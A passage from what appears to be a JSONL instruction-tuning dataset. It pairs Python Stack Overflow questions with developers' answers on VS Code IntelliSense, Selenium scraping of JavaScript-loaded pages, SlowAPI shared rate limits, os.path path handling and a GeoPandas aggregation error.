 2   9       PQR\n4         Mac  3  45       PQR\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to make VS code IntelliSense to show class only attributes not the built object attributes?<p>I have a python class and i want to see only the class attributes in the intellisense suggestions.<\/p>\n<pre><code>class car():\n    def __init__(self, brand, model, year):\n        self.brand = brand\n        self.model = model\n        self.year = year\n\n\nc1 = car()\n<\/code><\/pre>\n<p>when I use the &quot;c1.&quot; I see the results like &quot;__ dir__&quot;,&quot;__ getattribute__&quot; etc. But i want to see only the &quot;brand&quot;, &quot;model&quot; &amp; &quot;year&quot; in the intellisense suggestions.<\/p>\n<p>Is there anything to override this behavior ?<\/p>","output_text":"<p>The reason for displaying &quot;__ dir__&quot;, &quot;__ getattribute__&quot; is the &quot;<code>__init__<\/code>&quot; method used in the code, which comes from the file &quot;<code>builtins.pyi<\/code>&quot;, and this file also includes &quot;__ dir__&quot;, &quot;__ getattribute__&quot;\uff1a<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/u0Zn7.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/u0Zn7.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>Solution: For example, turn off &quot;<code>__dir__<\/code>&quot;: (comment out &quot;<code>def __dir__(self) -&gt; Iterable[str]: ...<\/code>&quot; in &quot;<code>builtins.pyi<\/code>&quot;)<\/p>\n<p>Before:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/qIl0U.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/qIl0U.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>After:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/frTdm.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/frTdm.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>Update:<\/p>\n<p>I tried to turn off the other displays in turn, the following is the code I commented in &quot;<code>builtins.pyi<\/code>&quot;:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/DhyHb.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/DhyHb.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>There are only four options left: (because this file defines them)<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/HpSxe.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/HpSxe.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>However, in order to avoid affecting the use of the code, it is not recommended that you change this file. And this does not affect the prompt content &quot;brand&quot;, &quot;model&quot;, &quot;year&quot; as the first display: (When I use the small box, it will display the preferences, and keep it.)<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/yreq1.gif\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/yreq1.gif\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Using bs4 and requests (or selenium) in python is it possible to get the information that is added after page load (most likely by js)?<p>I am working on a project in python and it is my first time using bs4 and requests. I have a page that loads, but all the information is added after by js. Using bs4 and requests I can't seems to get the data added by js, how would I do it?<\/p>\n<pre><code>import requests\nfrom bs4 import BeautifulSoup\n\npage = &quot;https:\/\/covid-19-newfoundland-and-labrador-gnl.hub.arcgis.com&quot;\nresult = requests.get(page)\nsource = result.text\n\nsoup = BeautifulSoup(source, 'html.parser')\n\nif soup.head.parent.name == 'html':\n    print(soup.title)\n    tmpBody = soup.body\n    # print(soup)\n    div1 = soup.find(id=&quot;ember63&quot;)\n    print(soup.find_all('section'))\n    print(div1)\nelse:\n    print(&quot;not html&quot;)\n\n<\/code><\/pre>\n<p>I found some code similar to this on stackoverflow but it says <code>chromedriver<\/code> executable needs to be on path, and I am not sure what <code>chromedriver<\/code> is.<\/p>\n<pre><code>from bs4 import BeautifulSoup\nfrom selenium import webdriver\n\nchrome_options = webdriver.ChromeOptions()\ndriver = webdriver.Chrome(chrome_options=chrome_options)\n\nurl = &quot;https:\/\/covid-19-newfoundland-and-labrador-gnl.hub.arcgis.com&quot;\ndriver.get(url)\npage = driver.page_source\n\nsoup = BeautifulSoup(page, 'html.parser')\n\nif soup.head.parent.name == 'html':\n    print(soup.title)\n    tmpBody = soup.body\n    div1 = soup.find(id=&quot;ember63&quot;)\n    print(soup.find_all('section'))\n    print(div1)\nelse:\n    print(&quot;not html&quot;)\n<\/code><\/pre>","output_text":"<p>Without knowing exact what you want i guess this is near:<\/p>\n<pre><code>from selenium import webdriver\n\nchrome_options = webdriver.ChromeOptions()\ndriver = webdriver.Chrome(chrome_options=chrome_options)\n\nurl = &quot;https:\/\/covid-19-newfoundland-and-labrador-gnl.hub.arcgis.com&quot;\ndriver.get(url)\ndriver.implicitly_wait(15)\n\ndiv1 = driver.find_element_by_css_selector('#ember63').text.strip()\nprint(*[section.text.strip() for section in driver.find_elements_by_css_selector('section')])\nprint(div1)\ndriver.close()\n<\/code><\/pre>\n<p>prints:<\/p>\n<pre><code>Covid-19 Home Pandemic Update\nTotal # of Cases\n......\nNew Cases\nLast new case: July 26, 2020\nTotal Recovered\n......\nCurrently Hospitalized\n.......\nCurrently in ICU\n......\nTotal Deaths\n...... Active Cases\n......\nTotal # of People Tested\n......\n<\/code><\/pre>\n<p>And so on..<\/p>\n<p>This also do it al in the same libe without need of BeautifulSoup.\nWhy selenium not working for you is answered in the comments<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n FastAPI and SlowAPI limit request under all \u201cpath\/*\u201d<p>I'm having a problem with SlowAPI. All requests are limited according to the middleware, but I cannot manage to jointly limit all requests under the path <code>\/schools\/<\/code><\/p>\n<p>My code:<\/p>\n<pre><code>from fastapi import FastAPI, Request, Response, status\nfrom fastapi.middleware.cors import CORSMiddleware\nfrom slowapi import Limiter, _rate_limit_exceeded_handler\nfrom slowapi.util import get_remote_address\nfrom slowapi.errors import RateLimitExceeded\nfrom slowapi.middleware import SlowAPIMiddleware\n\nlimiter = Limiter(key_func=get_remote_address, default_limits=[&quot;2\/5seconds&quot;])\napp = FastAPI()\napp.state.limiter = limiter\napp.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)\n\norigins = [&quot;http:\/\/127.0.0.1\/&quot;, &quot;http:\/\/localhost&quot;, &quot;http:\/\/192.168.1.75&quot;] ## CORS\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=origins,\n    allow_credentials=True,\n    allow_methods=[&quot;*&quot;],\n    allow_headers=[&quot;*&quot;],\n)\napp.add_middleware(SlowAPIMiddleware) ## Rate-limit all request\n\n@app.get('\/schools\/{regione}\/{provincia}\/{comune}')\ndef search_school(request: Request, response: Response, regione: str, provincia: str, comune: str):\n        return {&quot;message&quot;: 'No schools found!', &quot;status&quot;: 'error', &quot;code&quot;: 200} ## Or if found return schools informations\n\n@app.get('\/testpath\/{regione}') ## Works with one path. If I add &quot;provincia&quot; and &quot;comune&quot; non work\ndef search_school(request: Request, response: Response, regione: str, provincia: str, comune: str):\n        return {&quot;message&quot;: 'No schools found!', &quot;status&quot;: 'error', &quot;code&quot;: 200} ## Or if found return schools informations\n<\/code><\/pre>\n<p>When i send a request to <code>\/schools\/{region}\/{province}\/{city}<\/code> with jQuery the whole url is limited and therefore if I change region or province the limits are reset. How can I make myself apply settings for <code>\/schools\/*<\/code><\/p>\n<p>Example:<\/p>\n<p><em>2 request every 5 seconds<\/em><\/p>\n<p>If i send to request to <code>apiURL+\/schools\/Lombardy\/Milan\/Milan<\/code> the limit increases by 1 and if i made anothe 2 request at the third I get blocked.<\/p>\n<p>But if instead of making it to the same domain, I change the city (<code>apiURL+\/schools\/Sicily\/Palermo\/Palermo<\/code>), the limit resets and returns to 1<\/p>","output_text":"<h2>Option 1<\/h2>\n<p>Define <code>application_limits<\/code> when instantiating the <code>Limiter<\/code> class, as shown below. As per the <a href=\"https:\/\/slowapi.readthedocs.io\/en\/latest\/api\/\" rel=\"nofollow noreferrer\">documentation<\/a>,<\/p>\n<blockquote>\n<p><strong>application_limits<\/strong>:\na variable list of strings or callables returning strings for limits\nthat are applied to the entire application (i.e., a shared limit for all\nroutes)<\/p>\n<\/blockquote>\n<p>Thus, the below would apply a shared limit to all <code>\/schools\/*<\/code> routes, as well as any other route that might be in your application (e.g., <code>\/testpath\/*<\/code>, <code>\/some-other-route\/<\/code>, and so on), meaning that, only two requests per 5 seconds would go through by each client (regardless of the endpoint they would call).<\/p>\n<pre><code>limiter = Limiter(key_func=get_remote_address, application_limits=[&quot;2\/5seconds&quot;])\n<\/code><\/pre>\n<h2>Option 2<\/h2>\n<p>Apply a shared limit only to the endpoints you wish, using <code>shared_limit<\/code>.  As per the <a href=\"https:\/\/slowapi.readthedocs.io\/en\/latest\/api\/\" rel=\"nofollow noreferrer\">documentation<\/a>:<\/p>\n<blockquote>\n<p><strong>shared_limit<\/strong>: Decorator to be applied to multiple routes sharing the same rate limit.<\/p>\n<\/blockquote>\n<p>Thus, the below would apply a shared limit only to <code>\/schools\/*<\/code> routes.<\/p>\n<pre><code>limiter = Limiter(key_func=get_remote_address, default_limits=[&quot;2\/5seconds&quot;])\n\n@app.get('\/schools\/{regione}\/{provincia}\/{comune}')\n@limiter.shared_limit(limit_value=&quot;2\/5seconds&quot;, scope=&quot;schools&quot;) \ndef search_school(request: Request, response: Response, regione: str, provincia: str, comune: str):\n        return {&quot;message&quot;: 'No schools found!', &quot;status&quot;: 'error', &quot;code&quot;: 200}\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why python os module not giving me the correct file location of the file?<blockquote>\n<p>I want to find get the location of files by just typing the file name and the correct extension\nSo in python we normally do this by importing the os module and then typing -: <br\/><br\/>\nos.path.abspath(&quot;file name.extension&quot;)<br\/><br\/>\nBut my program is not giving me the correct file location I have written this code-:<\/p>\n<\/blockquote>\n<pre><code>from kivy.lang import Builder\nfrom kivymd.uix.list import OneLineListItem\nfrom kivymd.app import MDApp\nfrom kivy.core.audio import SoundLoader\nimport os\n\nhelper_string = &quot;&quot;&quot;\nScreen:\n    BoxLayout:\n        orientation: &quot;vertical&quot;\n        ScrollView:\n            MDList:\n                id: scroll\n\n&quot;&quot;&quot;\n\n\nclass MainApp(MDApp):\n    def build(self):\n        screen = Builder.load_string(helper_string)\n        return screen\n\n    def on_start(self):\n        for root, dirs, files in os.walk('C:\/'):\n            for file in files:\n                if file.endswith('.mp3'):\n                    required_file = file\n                    the_location = os.path.abspath(required_file)\n                    self.root.ids.scroll.add_widget(OneLineListItem(text=required_file, on_release=self.play_song))\n                    # print(required_file)\n\n    def play_song(self, onelinelistitem):\n        # print('play:', onelinelistitem.text)\n        the_song_path = os.path.abspath(onelinelistitem.text)\n        sound = SoundLoader.load(the_song_path)\n        if sound:\n            sound.play()\n        print(the_song_path)\n\n\nMainApp().run()\n<\/code><\/pre>\n<blockquote>\n<p><strong>You can just ignore the SoundLoader.load code and all the other kivy code<\/strong><br\/><br\/>\nNow when the code runs we have to select a file and it will print the file location on the console\nBut it is printing the wrong location and hence, the SoundLoader is not able to load the files...<br\/><br\/>\n<em><strong>For example a song in my computer is on this location -:<br\/><br\/>C:\\Users\\SAMARTH KUMAR PANDEY\\Downloads\\SHAREit\\V1.12\\music\\Godzilla (feat. Juice WRLD) [Official Audio].mp3<br\/><br\/>But on the console it is printing this path -: <br\/><br\/>C:\\Users\\SAMARTH KUMAR PANDEY\\PycharmProjects\\Kivy\\venv\\Godzilla (feat. Juice WRLD) [Official Audio].mp3<\/strong><\/em><br\/><br\/>\nBut the fact is that I do not have any songs in my <em>C:\\Users\\SAMARTH KUMAR PANDEY\\PycharmProjects\\Kivy\\venv<\/em> folder\nCan anyone help me out please<\/p>\n<\/blockquote>","output_text":"<p><a href=\"https:\/\/docs.python.org\/3.8\/library\/os.path.html\" rel=\"nofollow noreferrer\">os.path.abspath<\/a> will return the absolute path from the current directory which in your case is &quot;C:\\Users\\SAMARTH KUMAR PANDEY\\PycharmProjects\\Kivy\\venv&quot;<\/p>\n<p>What you might want to do is to join the path to your traversal like<\/p>\n<pre><code>the_location = os.path.join(root, required_file)\n<\/code><\/pre>\n<p>PS: You don't need to create the reference to required_file. You can use file.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n GeoDataFrame Value Error: 'data' should be a 1-dimensional array of geometry objects'<p>I want to quantify some geolocations with osmnx using the nearest_edges-function. I get a value error message when running this code and don't know what I'm doing wrong:<\/p>\n<pre><code># project graph and points\nG_proj = ox.project_graph(G)\ngdf_loc_p = gdf_loc[&quot;geometry&quot;].to_crs(G_proj.graph[&quot;crs&quot;])\n\nne, d = ox.nearest_edges(\n    G_proj, X=gdf_loc_p.x.values, Y=gdf_loc_p.y.values, return_dist=True\n)\n\n# reindex points based on results from nearest_edges\ngdf_loc = (\n    gdf_loc.set_index(pd.MultiIndex.from_tuples(ne, names=[&quot;u&quot;, &quot;v&quot;, &quot;key&quot;]))\n    .assign(distance=d)\n    .sort_index()\n)\n\n# join geometry from edges back to points\n# aggregate so have number of accidents on each edge\ngdf_bad_roads = (\n    gdf_edges.join(gdf_loc, rsuffix=&quot;_loc&quot;, how=&quot;inner&quot;)\n    .groupby([&quot;u&quot;, &quot;v&quot;, &quot;key&quot;])\n    .agg(geometry = (&quot;geometry&quot;, &quot;first&quot;), number=(&quot;osmid&quot;, &quot;size&quot;))\n    .set_crs(gdf_edges.crs)\n)\n<\/code><\/pre>\n<p>When running it tells me in the line .agg(geometry)<code># we require a list, but not a 'str'<\/code> and from there on couple more issues leading to a value error <code>data' should be a 1-dimensional array of geometry objects<\/code>. I attached the whole Traceback. Thanks for your help!<\/p>\n<pre><code>---------------------------------------------------------------------------\nValueError                                Traceback (most recent call last)\n\/var\/folders\/jy\/1f2tlvb965g30zhw9q3cvdw07r5rb_\/T\/ipykernel_82991\/3621029527.py in &lt;module&gt;\n      2 # aggregate so have number of accidents on each edge\n      3 gdf_bad_roads = (\n----&gt; 4     gdf_edges.join(gdf_loc, rsuffix=&quot;_loc&quot;, how=&quot;inner&quot;)\n      5     .groupby([&quot;u&quot;, &quot;v&quot;, &quot;key&quot;])\n      6     .agg(geometry = (&quot;geometry&quot;, &quot;first&quot;), number=(&quot;osmid&quot;, &quot;size&quot;))\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/groupby\/generic.py in aggregate(self, func, engine, engine_kwargs, *args, **kwargs)\n    977 \n    978         op = GroupByApply(self, func, args, kwargs)\n--&gt; 979         result = op.agg()\n    980         if not is_dict_like(func) and result is not None:\n    981             return result\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/apply.py in agg(self)\n    159 \n    160         if is_dict_like(arg):\n--&gt; 161             return self.agg_dict_like()\n    162         elif is_list_like(arg):\n    163             # we require a list, but not a 'str'\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/apply.py in agg_dict_like(self)\n    457 \n    458             axis = 0 if isinstance(obj, ABCSeries) else 1\n--&gt; 459             result = concat(\n    460                 {k: results[k] for k in keys_to_use}, axis=axis, keys=keys_to_use\n    461             )\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/util\/_decorators.py in wrapper(*args, **kwargs)\n    309                     stacklevel=stacklevel,\n    310                 )\n--&gt; 311             return func(*args, **kwargs)\n    312 \n    313         return wrapper\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/reshape\/concat.py in concat(objs, axis, join, ignore_index, keys, levels, names, verify_integrity, sort, copy)\n    305     )\n    306 \n--&gt; 307     return op.get_result()\n    308 \n    309 \n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/reshape\/concat.py in get_result(self)\n    537 \n    538             cons = sample._constructor\n--&gt; 539             return cons(new_data).__finalize__(self, method=&quot;concat&quot;)\n    540 \n    541     def _get_result_dim(self) -&gt; int:\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/geopandas\/geodataframe.py in __init__(self, data, geometry, crs, *args, **kwargs)\n    155             try:\n    156                 if (\n--&gt; 157                     hasattr(self[&quot;geometry&quot;].values, &quot;crs&quot;)\n    158                     and self[&quot;geometry&quot;].values.crs\n    159                     and crs\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/geopandas\/geodataframe.py in __getitem__(self, key)\n   1325         GeoDataFrame.\n   1326         &quot;&quot;&quot;\n-&gt; 1327         result = super().__getitem__(key)\n   1328         geo_col = self._geometry_column_name\n   1329         if isinstance(result, Series) and isinstance(result.dtype, GeometryDtype):\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/frame.py in __getitem__(self, key)\n   3424             if self.columns.is_unique and key in self.columns:\n   3425                 if isinstance(self.columns, MultiIndex):\n-&gt; 3426                     return self._getitem_multilevel(key)\n   3427                 return self._get_item_cache(key)\n   3428 \n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/frame.py in _getitem_multilevel(self, key)\n   3511             result_columns = maybe_droplevels(new_columns, key)\n   3512             if self._is_mixed_type:\n-&gt; 3513                 result = self.reindex(columns=new_columns)\n   3514                 result.columns = result_columns\n   3515             else:\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/util\/_decorators.py in wrapper(*args, **kwargs)\n    322         @wraps(func)\n    323         def wrapper(*args, **kwargs) -&gt; Callable[..., Any]:\n--&gt; 324             return func(*args, **kwargs)\n    325 \n    326         kind = inspect.Parameter.POSITIONAL_OR_KEYWORD\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/frame.py in reindex(self, *args, **kwargs)\n   4770         kwargs.pop(&quot;axis&quot;, None)\n   4771         kwargs.pop(&quot;labels&quot;, None)\n-&gt; 4772         return super().reindex(**kwargs)\n   4773 \n   4774     @deprecate_nonkeyword_arguments(version=None, allowed_args=[&quot;self&quot;, &quot;labels&quot;])\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/generic.py in reindex(self, *args, **kwargs)\n   4816 \n   4817         # perform the reindex on the axes\n-&gt; 4818         return self._reindex_axes(\n   4819             axes, level, limit, tolerance, method, fill_value, copy\n   4820         ).__finalize__(self, method=&quot;reindex&quot;)\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/frame.py in _reindex_axes(self, axes, level, limit, tolerance, method, fill_value, copy)\n   4589         columns = axes[&quot;columns&quot;]\n   4590         if columns is not None:\n-&gt; 4591             frame = frame._reindex_columns(\n   4592                 columns, method, copy, level, fill_value, limit, tolerance\n   4593             )\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/frame.py in _reindex_columns(self, new_columns, method, copy, level, fill_value, limit, tolerance)\n   4634             new_columns, method=method, level=level, limit=limit, tolerance=tolerance\n   4635         )\n-&gt; 4636         return self._reindex_with_indexers(\n   4637             {1: [new_columns, indexer]},\n   4638             copy=copy,\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/pandas\/core\/generic.py in _reindex_with_indexers(self, reindexers, fill_value, copy, allow_dups)\n   4895             new_data = new_data.copy()\n   4896 \n-&gt; 4897         return self._constructor(new_data).__finalize__(self)\n   4898 \n   4899     def filter(\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/geopandas\/geodataframe.py in __init__(self, data, geometry, crs, *args, **kwargs)\n    162                     _crs_mismatch_warning()\n    163                     # TODO: raise error in 0.9 or 0.10.\n--&gt; 164                 self[&quot;geometry&quot;] = _ensure_geometry(self[&quot;geometry&quot;].values, crs)\n    165             except TypeError:\n    166                 pass\n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/geopandas\/geodataframe.py in _ensure_geometry(data, crs)\n     44             return GeoSeries(out, index=data.index, name=data.name)\n     45         else:\n---&gt; 46             out = from_shapely(data, crs=crs)\n     47             return out\n     48 \n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/geopandas\/array.py in from_shapely(data, crs)\n    149 \n    150     &quot;&quot;&quot;\n--&gt; 151     return GeometryArray(vectorized.from_shapely(data), crs=crs)\n    152 \n    153 \n\n~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.10\/site-packages\/geopandas\/array.py in __init__(self, data, crs)\n    278             )\n    279         elif not data.ndim == 1:\n--&gt; 280             raise ValueError(\n    281                 &quot;'data' should be a 1-dimensional array of geometry objects.&quot;\n    282             )\n\nValueError: 'data' should be a 1-dimensional array of geometry objects.\n<\/code><\/pre>\n<p><strong>Edit:<\/strong> thank you! Unfortunately it doesnt work. I downgraded Python to 3.9 (and upgraded Panda to 1.4 but have same issue). I added the Traceback of the other code as well.<\/p>\n<pre><code>\n----\n---------------------------------------------------------------------------\nValueError                                Traceback (most recent call last)\nInput In [4], in &lt;cell line: 4&gt;()\n      2 gdf_bad_roads = gdf_edges.join(gdf_loc, rsuffix=&quot;_loc&quot;, how=&quot;inner&quot;)\n      3 # aggregate so have number of accidents on each edge\n----&gt; 4 gdf_bad_roads_agg = gdf_bad_roads.groupby([&quot;u&quot;, &quot;v&quot;, &quot;key&quot;]).agg(\n      5     geometry=(&quot;geometry&quot;, &quot;first&quot;), number=(&quot;osmid&quot;, &quot;size&quot;)\n      6 ).set_crs(gdf_edges.crs)\n      8 print(f&quot;&quot;&quot;\n      9 pandas: {pd.__version__}\n     10 geopandas: {gpd.__version__}\n     11 osmnx: {ox.__version__}&quot;&quot;&quot;)\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/groupby\/generic.py:869, in DataFrameGroupBy.aggregate(self, func, engine, engine_kwargs, *args, **kwargs)\n    866 func = maybe_mangle_lambdas(func)\n    868 op = GroupByApply(self, func, args, kwargs)\n--&gt; 869 result = op.agg()\n    870 if not is_dict_like(func) and result is not None:\n    871     return result\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/apply.py:168, in Apply.agg(self)\n    165     return self.apply_str()\n    167 if is_dict_like(arg):\n--&gt; 168     return self.agg_dict_like()\n    169 elif is_list_like(arg):\n    170     # we require a list, but not a 'str'\n    171     return self.agg_list_like()\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/apply.py:498, in Apply.agg_dict_like(self)\n    495         keys_to_use = ktu\n    497     axis = 0 if isinstance(obj, ABCSeries) else 1\n--&gt; 498     result = concat(\n    499         {k: results[k] for k in keys_to_use}, axis=axis, keys=keys_to_use\n    500     )\n    501 elif any(is_ndframe):\n    502     # There is a mix of NDFrames and scalars\n    503     raise ValueError(\n    504         &quot;cannot perform both aggregation &quot;\n    505         &quot;and transformation operations &quot;\n    506         &quot;simultaneously&quot;\n    507     )\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/util\/_decorators.py:311, in deprecate_nonkeyword_arguments.&lt;locals&gt;.decorate.&lt;locals&gt;.wrapper(*args, **kwargs)\n    305 if len(args) &gt; num_allow_args:\n    306     warnings.warn(\n    307         msg.format(arguments=arguments),\n    308         FutureWarning,\n    309         stacklevel=stacklevel,\n    310     )\n--&gt; 311 return func(*args, **kwargs)\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/reshape\/concat.py:359, in concat(objs, axis, join, ignore_index, keys, levels, names, verify_integrity, sort, copy)\n    155 &quot;&quot;&quot;\n    156 Concatenate pandas objects along a particular axis with optional set logic\n    157 along the other axes.\n   (...)\n    344 ValueError: Indexes have overlapping values: ['a']\n    345 &quot;&quot;&quot;\n    346 op = _Concatenator(\n    347     objs,\n    348     axis=axis,\n   (...)\n    356     sort=sort,\n    357 )\n--&gt; 359 return op.get_result()\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/reshape\/concat.py:599, in _Concatenator.get_result(self)\n    596     new_data._consolidate_inplace()\n    598 cons = sample._constructor\n--&gt; 599 return cons(new_data).__finalize__(self, method=&quot;concat&quot;)\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/geopandas\/geodataframe.py:157, in GeoDataFrame.__init__(self, data, geometry, crs, *args, **kwargs)\n    154 index = self.index\n    155 try:\n    156     if (\n--&gt; 157         hasattr(self[&quot;geometry&quot;].values, &quot;crs&quot;)\n    158         and self[&quot;geometry&quot;].values.crs\n    159         and crs\n    160         and not self[&quot;geometry&quot;].values.crs == crs\n    161     ):\n    162         _crs_mismatch_warning()\n    163         # TODO: raise error in 0.9 or 0.10.\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/geopandas\/geodataframe.py:1327, in GeoDataFrame.__getitem__(self, key)\n   1321 def __getitem__(self, key):\n   1322     &quot;&quot;&quot;\n   1323     If the result is a column containing only 'geometry', return a\n   1324     GeoSeries. If it's a DataFrame with a 'geometry' column, return a\n   1325     GeoDataFrame.\n   1326     &quot;&quot;&quot;\n-&gt; 1327     result = super().__getitem__(key)\n   1328     geo_col = self._geometry_column_name\n   1329     if isinstance(result, Series) and isinstance(result.dtype, GeometryDtype):\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/frame.py:3473, in DataFrame.__getitem__(self, key)\n   3471     if self.columns.is_unique and key in self.columns:\n   3472         if isinstance(self.columns, MultiIndex):\n-&gt; 3473             return self._getitem_multilevel(key)\n   3474         return self._get_item_cache(key)\n   3476 # Do we have a slicer (on rows)?\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/frame.py:3560, in DataFrame._getitem_multilevel(self, key)\n   3558 result_columns = maybe_droplevels(new_columns, key)\n   3559 if self._is_mixed_type:\n-&gt; 3560     result = self.reindex(columns=new_columns)\n   3561     result.columns = result_columns\n   3562 else:\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/util\/_decorators.py:324, in rewrite_axis_style_signature.&lt;locals&gt;.decorate.&lt;locals&gt;.wrapper(*args, **kwargs)\n    322 @wraps(func)\n    323 def wrapper(*args, **kwargs) -&gt; Callable[..., Any]:\n--&gt; 324     return func(*args, **kwargs)\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/frame.py:4798, in DataFrame.reindex(self, *args, **kwargs)\n   4796 kwargs.pop(&quot;axis&quot;, None)\n   4797 kwargs.pop(&quot;labels&quot;, None)\n-&gt; 4798 return super().reindex(**kwargs)\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/generic.py:4974, in NDFrame.reindex(self, *args, **kwargs)\n   4971     return self._reindex_multi(axes, copy, fill_value)\n   4973 # perform the reindex on the axes\n-&gt; 4974 return self._reindex_axes(\n   4975     axes, level, limit, tolerance, method, fill_value, copy\n   4976 ).__finalize__(self, method=&quot;reindex&quot;)\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/frame.py:4611, in DataFrame._reindex_axes(self, axes, level, limit, tolerance, method, fill_value, copy)\n   4609 columns = axes[&quot;columns&quot;]\n   4610 if columns is not None:\n-&gt; 4611     frame = frame._reindex_columns(\n   4612         columns, method, copy, level, fill_value, limit, tolerance\n   4613     )\n   4615 index = axes[&quot;index&quot;]\n   4616 if index is not None:\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/frame.py:4656, in DataFrame._reindex_columns(self, new_columns, method, copy, level, fill_value, limit, tolerance)\n   4643 def _reindex_columns(\n   4644     self,\n   4645     new_columns,\n   (...)\n   4651     tolerance=None,\n   4652 ):\n   4653     new_columns, indexer = self.columns.reindex(\n   4654         new_columns, method=method, level=level, limit=limit, tolerance=tolerance\n   4655     )\n-&gt; 4656     return self._reindex_with_indexers(\n   4657         {1: [new_columns, indexer]},\n   4658         copy=copy,\n   4659         fill_value=fill_value,\n   4660         allow_dups=False,\n   4661     )\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/pandas\/core\/generic.py:5054, in NDFrame._reindex_with_indexers(self, reindexers, fill_value, copy, allow_dups)\n   5051 if copy and new_data is self._mgr:\n   5052     new_data = new_data.copy()\n-&gt; 5054 return self._constructor(new_data).__finalize__(self)\n\nFile ~\/opt\/anaconda3\/envs\/pyproj_env\/lib\/python3.9\/site-packages\/geopandas\/geodataframe.py:164, in GeoDataFrame.__init__(self, data, geometry, crs, *args, **kwargs)\n    162         _crs_mismatch_warning()\n    163         # TODO: raise error in 0.9 or 